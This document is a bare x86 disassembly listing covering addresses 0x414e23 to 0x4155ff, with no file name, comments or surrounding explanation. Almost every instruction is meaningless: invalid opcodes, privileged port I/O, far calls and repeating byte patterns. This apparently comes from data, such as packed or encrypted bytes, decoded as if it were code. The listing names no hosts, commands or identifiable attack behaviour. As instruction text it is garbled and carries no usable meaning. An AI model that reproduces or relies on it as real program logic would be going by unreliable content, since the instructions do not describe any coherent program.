  414e23:	add    BYTE PTR [eax+0x41],bl
  414e26:	bound  edx,QWORD PTR [edx+0x47]
  414e29:	les    esi,FWORD PTR [ebp+0x47]
  414e2c:	or     DWORD PTR [ecx+0x5],eax
  414e2f:	cmp    al,0x42
  414e31:	aam    0x3c
  414e33:	test   DWORD PTR [eax+0x73],eax
  414e36:	dec    eax
  414e37:	lds    edi,FWORD PTR [edi]
  414e39:	sub    DWORD PTR [ebx+0x43],esp
  414e3c:	adc    al,0x42
  414e3e:	shl    BYTE PTR [eax+0x18],1
  414e41:	mov    esp,0xb3409042
  414e46:	gs dec ah
  414e49:	ror    DWORD PTR [ecx+0x51],0x40
  414e4d:	test   BYTE PTR [eax],al
  414e4f:	int3   
  414e50:	bound  eax,QWORD PTR ds:0xcc840f41
  414e56:	inc    ebx
  414e57:	add    BYTE PTR [eax+0x0],al
  414e5a:	inc    eax
  414e5b:	inc    eax
  414e5c:	inc    eax
  414e5d:	int3   
  414e5e:	add    BYTE PTR ds:0x62404341,al
  414e64:	pop    eax
  414e65:	add    BYTE PTR [ebx+0x40],al
  414e68:	bound  ecx,QWORD PTR [edi]
  414e6a:	inc    eax
  414e6b:	add    ebx,DWORD PTR [ecx+0x53]
  414e6e:	gs cdq 
  414e70:	xor    dl,BYTE PTR [ebx+eax*2]
  414e73:	inc    eax
  414e74:	xor    eax,0xaba80950
  414e79:	int    0xd1
  414e7b:	adc    eax,0x11d8155d
  414e80:	mov    al,0x50
  414e82:	dec    esp
  414e83:	inc    eax
  414e84:	pop    ss
  414e85:	jno    0x414ed9
  414e87:	mov    eax,0x12120d9d
  414e8c:	ins    BYTE PTR es:[edi],dx
  414e8d:	push   edx
  414e8e:	aad    0x41
  414e90:	dec    ebx
  414e92:	imul   eax,DWORD PTR [eax+0x79],0x51
  414e96:	or     eax,0x8e1047b6
  414e9b:	adc    al,0x26
  414e9d:	loope  0x414e94
  414e9f:	sar    BYTE PTR [esp+edx*2-0x4ccebfbf],0x63
  414ea7:	add    BYTE PTR [eax],al
  414ea9:	inc    eax
  414eaa:	inc    eax
  414eab:	cmovno eax,DWORD PTR ds:0x40056243
  414eb2:	int3   
  414eb3:	add    ah,cl
  414eb5:	inc    eax
  414eb6:	inc    eax
  414eb7:	bound  eax,QWORD PTR [ecx+0x0]
  414eba:	add    BYTE PTR [edi],cl
  414ebc:	inc    ebx
  414ebd:	inc    eax
  414ebe:	inc    eax
  414ebf:	add    BYTE PTR [ecx+0x43],al
  414ec2:	add    eax,0x40256240
  414ec7:	bound  eax,QWORD PTR [eax]
  414ec9:	retf   
  414eca:	push   0x5
  414ecc:	inc    ebx
  414ecd:	adc    esp,DWORD PTR [edi]
  414ecf:	inc    edx
  414ed0:	mov    eax,0x30cbe4b4
  414ed5:	inc    eax
  414ed6:	bnd jne 0x414f2b
  414ed9:	xor    DWORD PTR [edi+ebx*2-0x24],edi
  414edd:	push   cs
  414ede:	mov    edi,0x626b387b
  414ee3:	dec    ecx
  414ee4:	inc    edi
  414ee5:	inc    eax
  414ee6:	test   eax,0x7f6ccdf5
  414eeb:	adc    DWORD PTR [ebp+0x40cc0005],eax
  414ef1:	inc    ecx
  414ef2:	inc    eax
  414ef3:	inc    ebx
  414ef4:	bound  esp,QWORD PTR ds:0x41400043
  414efa:	add    BYTE PTR [eax],al
  414efc:	add    eax,0x43624062
  414f01:	inc    ecx
  414f02:	inc    eax
  414f03:	inc    eax
  414f04:	inc    eax
  414f05:	add    eax,0x40624340
  414f0a:	add    eax,0x40664140
  414f0f:	or     DWORD PTR [ebx+0x4d],eax
  414f12:	sub    sp,bx
  414f15:	mov    BYTE PTR [ebx+0x40],al
  414f18:	adc    BYTE PTR [ebx-0xa],dl
  414f1b:	sbb    eax,DWORD PTR [eax+0x63]
  414f1e:	nop
  414f1f:	pop    ds
  414f20:	xor    ecx,DWORD PTR [ecx-0x7]
  414f23:	ror    BYTE PTR [ebp+eiz*2+0x6e],0x40
  414f28:	pop    ecx
  414f29:	xchg   ebx,eax
  414f2a:	or     ecx,esp
  414f2c:	push   0x9114437c
  414f31:	sbb    cl,bl
  414f33:	push   0x40d1cd4c
  414f38:	imul   edx,DWORD PTR [ebp+0x43f152],0x5
  414f3f:	inc    eax
  414f40:	js     0x414f52
  414f42:	inc    ecx
  414f43:	bound  eax,QWORD PTR [eax+0x40]
  414f46:	sldt   WORD PTR [eax-0x34]
  414f4a:	js     0x414fae
  414f4c:	add    eax,0x40664143
  414f51:	inc    ebx
  414f52:	add    BYTE PTR [ecx+0x5],al
  414f55:	js     0x414f97
  414f57:	bound  eax,QWORD PTR [eax+0x0]
  414f5a:	inc    eax
  414f5b:	xor    al,0x19
  414f5d:	sbb    BYTE PTR [eax],dl
  414f5f:	xchg   ecx,eax
  414f60:	aas    
  414f61:	lds    esi,FWORD PTR [edi+eax*1+0x71405d90]
  414f68:	pop    esp
  414f69:	pusha  
  414f6a:	push   0xffffffc4
  414f6c:	adc    edx,esi
  414f6e:	sbb    DWORD PTR [ecx+0x31],esi
  414f71:	fld    DWORD PTR [ebp+0x62]
  414f74:	inc    eax
  414f75:	adc    BYTE PTR [eax+0x2e],al
  414f78:	inc    ecx
  414f79:	inc    ebx
  414f7a:	inc    eax
  414f7b:	inc    eax
  414f7c:	add    eax,0x434162
  414f81:	inc    eax
  414f82:	add    BYTE PTR [edx+0x5],ah
  414f85:	inc    eax
  414f86:	adc    BYTE PTR [edx+0x40],ah
  414f89:	inc    ebx
  414f8a:	inc    ecx
  414f8b:	add    eax,0x4340
  414f90:	add    eax,0x404162
  414f95:	add    BYTE PTR [eax+0x43],al
  414f98:	inc    eax
  414f99:	add    eax,0x4364652f
  414f9e:	cmp    eax,0x91511241
  414fa3:	or     DWORD PTR [eax+0x40436b20],eax
  414fa9:	dec    edx
  414faa:	inc    ecx
  414fab:	fadd   DWORD PTR [eax+0x33010a7]
  414fb1:	adc    DWORD PTR [ecx-0x1f54e9ae],edx
  414fb7:	fadd   DWORD PTR [eax+0x1f]
  414fba:	add    ebp,edx
  414fbc:	xor    al,0xbc
  414fbe:	push   edx
  414fbf:	inc    edi
  414fc0:	add    eax,0x8060d31f
  414fc5:	adc    al,0x40
  414fc7:	test   DWORD PTR [eax-0x4e],eax
  414fca:	ret    0xc5cd
  414fcd:	scas   eax,DWORD PTR es:[edi]
  414fce:	cmp    al,0x43
  414fd0:	add    al,0xf
  414fd2:	adc    eax,0x7a624165
  414fd7:	inc    eax
  414fd8:	add    BYTE PTR [eax],al
  414fda:	inc    ecx
  414fdb:	inc    ebx
  414fdc:	add    eax,0x41784062
  414fe1:	inc    eax
  414fe2:	inc    eax
  414fe3:	add    BYTE PTR [edi],cl
  414fe5:	bound  eax,QWORD PTR [ebx+0x0]
  414fe8:	add    eax,0x25006240
  414fed:	inc    eax
  414fee:	add    eax,0x40254143
  414ff3:	add    eax,0x90620000
  414ff8:	inc    eax
  414ff9:	inc    eax
  414ffa:	out    0x9,eax
  414ffc:	push   edx
  414ffd:	push   esi
  414ffe:	pop    ds
  414fff:	or     eax,DWORD PTR [eax+0x55]
  415002:	hlt    
  415003:	fadd   st,st(0)
  415005:	and    al,0x54
  415007:	test   al,0x40
  415009:	jne    0x41502f
  41500b:	push   edx
  41500c:	mov    ch,0x52
  41500e:	push   edx
  41500f:	inc    eax
  415010:	adc    al,0x43
  415012:	add    BYTE PTR [eax],al
  415014:	add    BYTE PTR [ecx+0x40],al
  415017:	bound  esp,QWORD PTR [esi+0x0]
  41501a:	inc    eax
  41501b:	add    eax,0x5400000
  415020:	inc    ecx
  415021:	inc    eax
  415022:	inc    eax
  415023:	bound  esp,QWORD PTR ds:0x25050043
  415029:	inc    ecx
  41502a:	inc    ebx
  41502b:	inc    eax
  41502c:	test   BYTE PTR [eax+0x0],al
  41502f:	bound  ebx,QWORD PTR [eax+0x62]
  415032:	inc    ecx
  415033:	inc    eax
  415034:	aas    
  415035:	dec    ebx
  415036:	int    0x90
  415038:	dec    ebx
  415039:	inc    eax
  41503a:	sub    al,BYTE PTR [eax+0x75]
  41503d:	xor    DWORD PTR [eax-0x58],esp
  415040:	xor    al,0x3c
  415042:	dec    eax
  415043:	sbb    BYTE PTR [edi],bh
  415045:	mov    ebp,0x6d9211c1
  41504a:	sub    al,BYTE PTR [eax+0x75]
  41504d:	dec    edx
  41504e:	gs mov ah,0xc5
  415051:	lods   al,BYTE PTR ds:[esi]
  415052:	cmp    dl,BYTE PTR [edi+edi*1]
  415055:	push   edx
  415056:	or     DWORD PTR ds:0x404acb01,ecx
  41505c:	jne    0x415087
  41505e:	fmul   st,st(5)
  415060:	push   esp
  415061:	adc    eax,0x103f6e44
  415066:	bound  eax,QWORD PTR [eax+0x41]
  415069:	and    eax,0x40000500
  41506e:	inc    ebx
  41506f:	add    eax,0x40624041
  415074:	inc    ebx
  415075:	add    eax,0x43402541
  41507a:	bound  eax,QWORD PTR [eax+0x43]
  41507d:	int3   
  41507e:	inc    eax
  41507f:	bound  eax,QWORD PTR [eax]
  415081:	inc    ecx
  415082:	inc    eax
  415083:	inc    eax
  415084:	add    eax,0x44524e05
  415089:	neg    DWORD PTR [edx+0x5b]
  41508c:	inc    eax
  41508d:	jne    0x415062
  41508f:	pop    es
  415090:	pop    ds
  415091:	dec    edi
  415092:	xchg   DWORD PTR [edi+0xe],eax
  415095:	aas    
  415096:	ins    BYTE PTR es:[edi],dx
  415097:	mov    ah,0x84
  415099:	dec    eax
  41509a:	push   eax
  41509b:	inc    ebx
  41509c:	inc    eax
  41509d:	(bad)  
  41509e:	cmp    edi,DWORD PTR [edi+0x30840d2d]
  4150a4:	cvtpi2ps xmm5,QWORD PTR [esi-0x41]
  4150a8:	pusha  
  4150a9:	inc    edi
  4150aa:	ret    
  4150ab:	adc    BYTE PTR [eax-0x41],al
  4150ae:	jne    0x41506e
  4150b0:	bound  eax,QWORD PTR [edx-0x6d]
  4150b3:	inc    edi
  4150b4:	or     edx,esp
  4150b6:	cmp    ebp,DWORD PTR [esi]
  4150b8:	add    eax,0x4085d33c
  4150bd:	bound  edx,QWORD PTR [ebx-0x2b]
  4150c0:	retf   
  4150c1:	bound  eax,QWORD PTR [eax+0x25]
  4150c4:	add    BYTE PTR [esi+0x40],ah
  4150c7:	add    eax,0x40404143
  4150cc:	inc    ebx
  4150cd:	add    BYTE PTR [eax],al
  4150cf:	add    BYTE PTR [edx-0x34],ah
  4150d2:	inc    eax
  4150d3:	add    eax,0x40004041
  4150d8:	inc    ecx
  4150d9:	int3   
  4150da:	add    BYTE PTR [ebx-0x7c],al
  4150dd:	add    eax,0x5406240
  4150e2:	bound  ebx,QWORD PTR [ecx+0x62]
  4150e5:	inc    ebx
  4150e6:	adc    al,0x33
  4150e8:	inc    ebx
  4150e9:	inc    edx
  4150ea:	inc    esi
  4150eb:	inc    ebp
  4150ec:	test   al,0x90
  4150ee:	inc    eax
  4150ef:	jns    0x4150e2
  4150f1:	pusha  
  4150f2:	fnsave ss:[ebx+0x28]
  4150f6:	add    esp,DWORD PTR [ebx]
  4150f8:	jp     0x415122
  4150fa:	mov    ebx,0x4043bdf7
  4150ff:	ins    BYTE PTR es:[edi],dx
  415100:	inc    eax
  415101:	bound  ebx,QWORD PTR [eax+0x41]
  415104:	add    eax,0x40404340
  415109:	inc    ebx
  41510a:	inc    eax
  41510b:	test   BYTE PTR [eax],al
  41510d:	add    eax,0x40624041
  415112:	inc    eax
  415113:	add    BYTE PTR [edx+0x5],ah
  415116:	inc    ebx
  415117:	add    BYTE PTR [eax+0x78],al
  41511a:	inc    ecx
  41511b:	add    BYTE PTR [eax+0x41],bl
  41511e:	(bad)
  415123:	inc    esp
  415124:	rcl    DWORD PTR ds:0xd009ff67,1
  41512a:	data16 sub cl,BYTE PTR [edx+0x40]
  41512e:	adc    ah,BYTE PTR [eax]
  415130:	fcom   DWORD PTR [edx+eiz*2+0x10]
  415134:	and    al,0x40
  415136:	test   BYTE PTR [eax],al
  415138:	int3   
  415139:	bound  eax,QWORD PTR ds:0xcc840f41
  41513f:	inc    ebx
  415140:	add    BYTE PTR [eax+0x0],al
  415143:	inc    eax
  415144:	inc    eax
  415145:	inc    eax
  415146:	int3   
  415147:	add    BYTE PTR ds:0x62404341,al
  41514d:	pop    eax
  41514e:	add    BYTE PTR [ebx+0x40],al
  415151:	bound  ecx,QWORD PTR [edi]
  415153:	inc    eax
  415154:	adc    ah,BYTE PTR [ebp-0x50]
  415157:	push   edx
  415158:	inc    edx
  415159:	rcl    BYTE PTR [eax-0x7f],0x40
  41515d:	sub    ah,BYTE PTR [edx]
  41515f:	pop    esp
  415160:	rcl    DWORD PTR [ebx+0x5],1
  415163:	mov    al,ds:0xa45e6114
  415168:	xchg   DWORD PTR [ebp+0x7d4041cd],esp
  41516e:	adc    al,BYTE PTR [eax+0x42]
  415171:	call   0x4060:0x68134343
  415178:	shl    DWORD PTR ds:0x9f403038,1
  41517e:	adc    eax,0x40000048
  415183:	inc    eax
  415184:	cmovno eax,DWORD PTR ds:0x40056243
  41518b:	int3   
  41518c:	add    ah,cl
  41518e:	inc    eax
  41518f:	inc    eax
  415190:	bound  eax,QWORD PTR [ecx+0x0]
  415193:	add    BYTE PTR [edi],cl
  415195:	inc    ebx
  415196:	inc    eax
  415197:	inc    eax
  415198:	add    BYTE PTR [ecx+0x43],al
  41519b:	add    eax,0x40256240
  4151a0:	bound  eax,QWORD PTR [eax]
  4151a2:	sub    eax,0xe0c3ca8
  4151a7:	sub    eax,0xab2000d7
  4151ac:	fs inc edi
  4151ae:	inc    eax
  4151af:	inc    esp
  4151b0:	xor    al,BYTE PTR [ecx-0x6e]
  4151b3:	xor    BYTE PTR [ebp-0x7b],bl
  4151b6:	or     DWORD PTR [eax+0x52],esp
  4151b9:	aam    0x6a
  4151bb:	mov    dh,al
  4151bd:	inc    ebx
  4151be:	inc    eax
  4151bf:	add    esi,DWORD PTR [ebx]
  4151c1:	mov    esp,0x90745d25
  4151c6:	pop    ds
  4151c7:	sub    DWORD PTR [esi],ecx
  4151c9:	aaa    
  4151ca:	dec    esp
  4151cb:	fwait
  4151cc:	cwde   
  4151cd:	lds    eax,FWORD PTR [eax-0x47]
  4151d0:	aad    0x50
  4151d2:	add    eax,0x4140cc00
  4151d7:	inc    eax
  4151d8:	inc    ebx
  4151d9:	bound  esp,QWORD PTR ds:0x41400043
  4151df:	add    BYTE PTR [eax],al
  4151e1:	add    eax,0x43624062
  4151e6:	inc    ecx
  4151e7:	inc    eax
  4151e8:	inc    eax
  4151e9:	inc    eax
  4151ea:	add    eax,0x40624340
  4151ef:	add    eax,0x40664140
  4151f4:	jg     0x41521e
  4151f6:	addr16 inc edi
  4151f8:	adc    al,0x29
  4151fa:	in     eax,dx
  4151fb:	push   edx
  4151fc:	cmp    eax,0x40c56989
  415201:	mov    edi,0xc56a4d79
  415206:	cld    
  415207:	inc    esi
  415208:	adc    BYTE PTR [edi],dl
  41520a:	mov    ebx,0xd5489ca8
  41520f:	push   esi
  415210:	inc    eax
  415211:	cmp    eax,0xfea88242
  415216:	cmp    dl,dl
  415218:	sbb    DWORD PTR [ecx],edx
  41521a:	shr    DWORD PTR [ebx-0x5036b097],1
  415220:	inc    eax
  415221:	jmp    0x415274
  415223:	inc    ecx
  415224:	mov    DWORD PTR [ebx+0x0],0x10784005
  41522b:	inc    ecx
  41522c:	bound  eax,QWORD PTR [eax+0x40]
  41522f:	sldt   WORD PTR [eax-0x34]
  415233:	js     0x415297
  415235:	add    eax,0x40664143
  41523a:	inc    ebx
  41523b:	add    BYTE PTR [ecx+0x5],al
  41523e:	js     0x415280
  415240:	bound  eax,QWORD PTR [eax+0x0]
  415243:	inc    eax
  415244:	mov    esp,0xe212414c
  415249:	xchg   edx,eax
  41524a:	inc    ecx
  41524b:	bound  eax,QWORD PTR ds:0xe4404305
  415251:	and    al,al
  415253:	dec    edx
  415254:	inc    ebx
  415255:	retf   
  415256:	xor    BYTE PTR [ebx],al
  415258:	pop    ds
  415259:	data16 sbb al,0x20
  41525c:	dec    eax
  41525d:	push   eax
  41525e:	or     BYTE PTR [eax+0x32],al
  415261:	push   ebx
  415262:	xor    al,0x71
  415264:	add    eax,0x40434115
  415269:	inc    eax
  41526a:	add    eax,0x434162
  41526f:	inc    eax
  415270:	add    BYTE PTR [edx+0x5],ah
  415273:	inc    eax
  415274:	adc    BYTE PTR [edx+0x40],ah
  415277:	inc    ebx
  415278:	inc    ecx
  415279:	add    eax,0x4340
  41527e:	add    eax,0x404162
  415283:	add    BYTE PTR [eax+0x43],al
  415286:	inc    eax
  415287:	add    eax,0x117e0547
  41528c:	bound  ebp,QWORD PTR [edi-0x35]
  41528f:	inc    ebx
  415290:	test   DWORD PTR [eax+0x63],eax
  415293:	cdq    
  415294:	inc    edi
  415295:	popf   
  415296:	pop    eax
  415297:	push   ecx
  415298:	inc    ebx
  415299:	add    al,0xec
  41529b:	inc    edx
  41529c:	fsub   QWORD PTR [ecx+ecx*2+0x40]
  4152a0:	add    BYTE PTR [eax],al
  4152a2:	inc    ecx
  4152a3:	inc    ebx
  4152a4:	add    eax,0x41784062
  4152a9:	inc    eax
  4152aa:	inc    eax
  4152ab:	add    BYTE PTR [edi],cl
  4152ad:	bound  eax,QWORD PTR [ebx+0x0]
  4152b0:	add    eax,0x25006240
  4152b5:	inc    eax
  4152b6:	add    eax,0x40254143
  4152bb:	add    eax,0xcb620000
  4152c0:	nop
  4152c1:	inc    eax
  4152c2:	jecxz  0x4152b5
  4152c4:	aas    
  4152c5:	leave  
  4152c6:	push   ebx
  4152c7:	dec    esp
  4152c8:	loop   0x41530a
  4152ca:	inc    ebp
  4152cb:	push   esi
  4152cc:	mov    BYTE PTR [eax+0x407247d4],bh
  4152d2:	mov    eax,ds:0x4f455271
  4152d7:	add    al,0xf5
  4152d9:	and    al,0x4f
  4152db:	scas   eax,DWORD PTR es:[edi]
  4152dc:	lds    ebp,FWORD PTR [eax+0x43a3609c]
  4152e2:	add    BYTE PTR [eax],al
  4152e4:	add    BYTE PTR [ecx+0x40],al
  4152e7:	bound  esp,QWORD PTR [esi+0x0]
  4152ea:	inc    eax
  4152eb:	add    eax,0x5400000
  4152f0:	inc    ecx
  4152f1:	inc    eax
  4152f2:	inc    eax
  4152f3:	bound  esp,QWORD PTR ds:0x25050043
  4152f9:	inc    ecx
  4152fa:	inc    ebx
  4152fb:	inc    eax
  4152fc:	test   BYTE PTR [eax+0x0],al
  4152ff:	bound  ebx,QWORD PTR [eax+0x62]
  415302:	inc    ecx
  415303:	inc    eax
  415304:	inc    eax
  415305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415306:	dec    ecx
  415307:	fst    DWORD PTR [esi]
  415309:	test   al,0x62
  41530b:	rol    DWORD PTR [eax+0x4d],0xd1
  41530f:	lds    esi,FWORD PTR [eax+0x405070bc]
  415315:	in     eax,0x61
  415317:	fs inc ebx
  415319:	bound  edi,QWORD PTR [ebp+0x43]
  41531c:	and    ecx,DWORD PTR [edx+0x79]
  41531f:	call   0x6340:0x33294042
  415326:	aam    0xa8
  415328:	inc    ecx
  415329:	xor    BYTE PTR [eax],dl
  41532b:	bound  eax,QWORD PTR [eax+0x41]
  41532e:	and    eax,0x40000500
  415333:	inc    ebx
  415334:	add    eax,0x40624041
  415339:	inc    ebx
  41533a:	add    eax,0x43402541
  41533f:	bound  eax,QWORD PTR [eax+0x43]
  415342:	int3   
  415343:	inc    eax
  415344:	bound  eax,QWORD PTR [eax]
  415346:	inc    ecx
  415347:	inc    eax
  415348:	inc    eax
  415349:	add    eax,0x4004f005
  41534e:	dec    esi
  41534f:	rcl    DWORD PTR [edx],cl
  415351:	hlt    
  415352:	fisttp WORD PTR [ebp+0x4a674047]
  415358:	inc    ecx
  415359:	and    ah,cl
  41535b:	test   al,0x85
  41535d:	and    bh,BYTE PTR [edi]
  41535f:	pop    edi
  415360:	xor    ebp,DWORD PTR [eax+0x4043d742]
  415366:	leave  
  415367:	inc    esp
  415368:	int    0x12
  41536a:	cwde   
  41536b:	xor    edx,DWORD PTR [eax-0x2bee98c0]
  415371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415372:	imul   edx,DWORD PTR [ecx],0xffffffff
  415375:	inc    eax
  415376:	push   esi
  415377:	aas    
  415378:	(bad)  
  415379:	adc    eax,0x21435443
  41537e:	and    esi,ecx
  415380:	inc    edx
  415381:	int    0xa8
  415383:	sbb    dl,cl
  415385:	bound  eax,QWORD PTR [eax+0x25]
  415388:	add    BYTE PTR [esi+0x40],ah
  41538b:	add    eax,0x40404143
  415390:	inc    ebx
  415391:	add    BYTE PTR [eax],al
  415393:	add    BYTE PTR [edx-0x34],ah
  415396:	inc    eax
  415397:	add    eax,0x40004041
  41539c:	inc    ecx
  41539d:	int3   
  41539e:	add    BYTE PTR [ebx-0x7c],al
  4153a1:	add    eax,0x5406240
  4153a6:	bound  eax,QWORD PTR [eax-0x13]
  4153a9:	adc    esp,DWORD PTR [edx-0x50]
  4153ac:	adc    BYTE PTR [edx-0x61],bl
  4153af:	inc    eax
  4153b0:	mov    ds:0xbccb68b0,al
  4153b5:	fs jns 0x4153f8
  4153b8:	cs pusha 
  4153ba:	xor    al,0x45
  4153bc:	add    eax,0x5850e86a
  4153c1:	mov    esi,0x40cb4440
  4153c6:	bound  ebx,QWORD PTR [eax+0x41]
  4153c9:	add    eax,0x40404340
  4153ce:	inc    ebx
  4153cf:	inc    eax
  4153d0:	test   BYTE PTR [eax],al
  4153d2:	add    eax,0x40624041
  4153d7:	inc    eax
  4153d8:	add    BYTE PTR [edx+0x5],ah
  4153db:	inc    ebx
  4153dc:	add    BYTE PTR [eax+0x78],al
  4153df:	inc    ecx
  4153e0:	add    BYTE PTR [eax+0x41],bl
  4153e3:	bound  esi,QWORD PTR [esp+ebp*4]
  4153e6:	inc    eax
  4153e7:	sub    ebx,ebx
  4153e9:	dec    ebp
  4153ea:	call   0x40830c32
  4153ef:	jecxz  0x4153ca
  4153f1:	das    
  4153f2:	cs inc esp
  4153f4:	or     eax,0x72e14043
  4153f9:	vaddps ymm1,ymm5,ymm1
  4153fd:	xor    BYTE PTR [eax+edx*8+0x16],al
  415401:	cld    
  415402:	int    0x70
  415404:	dec    edx
  415405:	add    BYTE PTR [eax+0x21],al
  415408:	adc    eax,0x431121c3
  41540d:	inc    edi
  41540e:	inc    eax
  41540f:	dec    ecx
  415410:	outs   dx,BYTE PTR ds:[esi]
  415411:	mov    esp,0x85443c34
  415416:	inc    eax
  415417:	mov    ds:0x4280055b,al
  41541c:	cmp    DWORD PTR [ebx+0x43],eax
  41541f:	scas   eax,DWORD PTR es:[edi]
  415420:	inc    eax
  415421:	test   BYTE PTR [eax],al
  415423:	int3   
  415424:	bound  eax,QWORD PTR ds:0xcc840f41
  41542a:	inc    ebx
  41542b:	add    BYTE PTR [eax+0x0],al
  41542e:	inc    eax
  41542f:	inc    eax
  415430:	inc    eax
  415431:	int3   
  415432:	add    BYTE PTR ds:0x62404341,al
  415438:	pop    eax
  415439:	add    BYTE PTR [ebx+0x40],al
  41543c:	bound  ecx,QWORD PTR [edi]
  41543e:	inc    eax
  41543f:	dec    edx
  415440:	retf   
  415441:	(bad)
  415444:	nop
  415445:	inc    eax
  415446:	xor    edx,DWORD PTR [edi+0x99490bc]
  41544c:	pushf  
  41544d:	inc    eax
  41544e:	inc    ecx
  41544f:	inc    edi
  415450:	inc    esp
  415451:	mov    edi,0x404324a8
  415456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415457:	repz sbb esi,DWORD PTR [ecx+edx*1+0x79]
  41545c:	rol    DWORD PTR [edx+0x2a],1
  41545f:	into   
  415460:	cwde   
  415461:	inc    esp
  415462:	mov    esp,0x41403434
  415467:	xchg   ecx,eax
  415468:	arpl   WORD PTR ds:0xd38041,di
  41546e:	add    BYTE PTR [eax+0x40],al
  415471:	cmovno eax,DWORD PTR ds:0x40056243
  415478:	int3   
  415479:	add    ah,cl
  41547b:	inc    eax
  41547c:	inc    eax
  41547d:	bound  eax,QWORD PTR [ecx+0x0]
  415480:	add    BYTE PTR [edi],cl
  415482:	inc    ebx
  415483:	inc    eax
  415484:	inc    eax
  415485:	add    BYTE PTR [ecx+0x43],al
  415488:	add    eax,0x40256240
  41548d:	bound  eax,QWORD PTR [eax]
  41548f:	inc    eax
  415490:	popa   
  415491:	jbe    0x41544f
  415493:	inc    esp
  415494:	pusha  
  415495:	lds    esi,FWORD PTR [eax-0x672ca8c0]
  41549b:	(bad)  
  41549c:	clc    
  41549d:	inc    ecx
  41549e:	pop    es
  41549f:	inc    ecx
  4154a0:	and    DWORD PTR [edi+0x4c446bf9],ebx
  4154a6:	inc    ecx
  4154a7:	inc    eax
  4154a8:	pop    ecx
  4154a9:	push   esi
  4154aa:	bound  esp,QWORD PTR [eax+0x70]
  4154ad:	cld    
  4154ae:	inc    ebx
  4154af:	inc    eax
  4154b0:	arpl   WORD PTR [ebx+0x36],si
  4154b3:	test   al,0x68
  4154b5:	les    esi,FWORD PTR [eax]
  4154b7:	inc    eax
  4154b8:	in     eax,0x48
  4154ba:	test   al,0x12
  4154bc:	sub    eax,0xe3417ca8
  4154c1:	add    eax,0x4140cc00
  4154c6:	inc    eax
  4154c7:	inc    ebx
  4154c8:	bound  esp,QWORD PTR ds:0x41400043
  4154ce:	add    BYTE PTR [eax],al
  4154d0:	add    eax,0x43624062
  4154d5:	inc    ecx
  4154d6:	inc    eax
  4154d7:	inc    eax
  4154d8:	inc    eax
  4154d9:	add    eax,0x40624340
  4154de:	add    eax,0x40664140
  4154e3:	jb     0x415539
  4154e5:	dec    eax
  4154e6:	test   eax,0x3f404712
  4154eb:	and    al,BYTE PTR [ecx+0x15]
  4154ee:	test   al,0x48
  4154f0:	test   DWORD PTR [eax+0x61],eax
  4154f3:	dec    eax
  4154f4:	test   bl,cl
  4154f6:	push   esp
  4154f7:	inc    ecx
  4154f8:	pusha  
  4154f9:	inc    eax
  4154fa:	pop    ds
  4154fb:	push   eax
  4154fc:	mov    edi,0x43df2344
  415501:	add    BYTE PTR ds:0x41107840,al
  415507:	bound  eax,QWORD PTR [eax+0x40]
  41550a:	sldt   WORD PTR [eax-0x34]
  41550e:	js     0x415572
  415510:	add    eax,0x40664143
  415515:	inc    ebx
  415516:	add    BYTE PTR [ecx+0x5],al
  415519:	js     0x41555b
  41551b:	bound  eax,QWORD PTR [eax+0x0]
  41551e:	inc    eax
  41551f:	lock inc ebx
  415521:	dec    edx
  415522:	daa    
  415523:	and    al,0x3f
  415525:	leave  
  415526:	int3   
  415527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415528:	inc    eax
  415529:	mov    eax,ds:0x3c50c546
  41552e:	inc    ebx
  41552f:	mov    ecx,0x87155540
  415534:	arpl   WORD PTR [esi],ax
  415536:	dec    eax
  415537:	inc    ebx
  415538:	inc    eax
  415539:	and    eax,DWORD PTR [ecx+0x43]
  41553c:	inc    eax
  41553d:	inc    eax
  41553e:	add    eax,0x434162
  415543:	inc    eax
  415544:	add    BYTE PTR [edx+0x5],ah
  415547:	inc    eax
  415548:	adc    BYTE PTR [edx+0x40],ah
  41554b:	inc    ebx
  41554c:	inc    ecx
  41554d:	add    eax,0x4340
  415552:	add    eax,0x404162
  415557:	add    BYTE PTR [eax+0x43],al
  41555a:	inc    eax
  41555b:	add    eax,0x42594169
  415560:	add    al,0xd2
  415562:	inc    eax
  415563:	push   eax
  415564:	jno    0x415547
  415566:	shl    BYTE PTR [ecx],1
  415568:	dec    edx
  415569:	fdiv   QWORD PTR [eax]
  41556b:	and    ebx,DWORD PTR [esp-0x3]
  41556f:	bound  ebp,QWORD PTR [di-0x16]
  415573:	dec    esp
  415574:	sar    DWORD PTR [edi-0x30eaf22f],cl
  41557a:	je     0x415521
  41557c:	xchg   edi,eax
  41557d:	mov    edi,0xf509a836
  415582:	std    
  415583:	push   ebp
  415584:	inc    eax
  415585:	mov    ebp,0x41cdc4a6
  41558a:	mul    DWORD PTR [edi+0x326350d3]
  415590:	daa    
  415591:	inc    eax
  415592:	add    BYTE PTR [eax],al
  415594:	inc    ecx
  415595:	inc    ebx
  415596:	add    eax,0x41784062
  41559b:	inc    eax
  41559c:	inc    eax
  41559d:	add    BYTE PTR [edi],cl
  41559f:	bound  eax,QWORD PTR [ebx+0x0]
  4155a2:	add    eax,0x25006240
  4155a7:	inc    eax
  4155a8:	add    eax,0x40254143
  4155ad:	add    eax,0x43620000
  4155b2:	retf   0x356c
  4155b5:	lds    eax,FWORD PTR [eax+0x62]
  4155b8:	clc    
  4155b9:	xor    BYTE PTR [eax+0x408777ab],al
  4155bf:	pop    ebx
  4155c0:	jo     0x41563a
  4155c2:	dec    ecx
  4155c3:	pop    edi
  4155c4:	arpl   WORD PTR [edi+0x47482440],di
  4155ca:	jno    0x41562d
  4155cc:	adc    edi,DWORD PTR [edi-0x7a43c53e]
  4155d2:	in     al,dx
  4155d3:	cmp    eax,0xc2bbdd6
  4155d8:	imul   eax,DWORD PTR [ebx+0x5],0x23
  4155dc:	push   ebx
  4155dd:	inc    ebx
  4155de:	add    BYTE PTR [eax],al
  4155e0:	add    BYTE PTR [ecx+0x40],al
  4155e3:	bound  esp,QWORD PTR [esi+0x0]
  4155e6:	inc    eax
  4155e7:	add    eax,0x5400000
  4155ec:	inc    ecx
  4155ed:	inc    eax
  4155ee:	inc    eax
  4155ef:	bound  esp,QWORD PTR ds:0x25050043
  4155f5:	inc    ecx
  4155f6:	inc    ebx
  4155f7:	inc    eax
  4155f8:	test   BYTE PTR [eax+0x0],al
  4155fb:	bound  ebx,QWORD PTR [eax+0x62]
  4155fe:	inc    ecx
  4155ff:	inc    eax
